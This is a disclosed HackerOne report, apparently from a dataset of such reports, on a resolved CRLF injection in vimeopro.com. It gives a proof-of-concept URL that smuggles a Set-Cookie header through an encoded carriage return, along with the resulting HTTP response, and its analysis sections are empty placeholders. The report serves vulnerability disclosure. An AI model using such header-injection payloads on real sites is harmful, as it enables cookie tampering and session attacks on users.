---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '39181'
original_report_id: '39181'
title: '[vimeopro.com] CRLF Injection'
team_handle: vimeo
created_at: '2014-12-12T19:33:03.836Z'
disclosed_at: '2016-10-24T21:45:00.298Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 9
tags:
- hackerone
---

# [vimeopro.com] CRLF Injection

## Metadata

- HackerOne Report ID: 39181
- Weakness: 
- Program: vimeo
- Disclosed At: 2016-10-24T21:45:00.298Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

PoC (for any browser other than FireFox)
http://www.vimeopro.com/crlftest%0dSet-Cookie:test=test;domain=.vimeopro.com

HTTP Response:
HTTP/1.1 301 Moved Permanently\r\n
Date: Fri, 12 Dec 2014 19:28:49 GMT\r\n
Server: Apache\r\n
Location: http://vimeopro.com/crlftest\r
Set-Cookie:test=test;domain=.vimeopro.com\r\n

Result:
Creating a cookie-param "test=test"

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
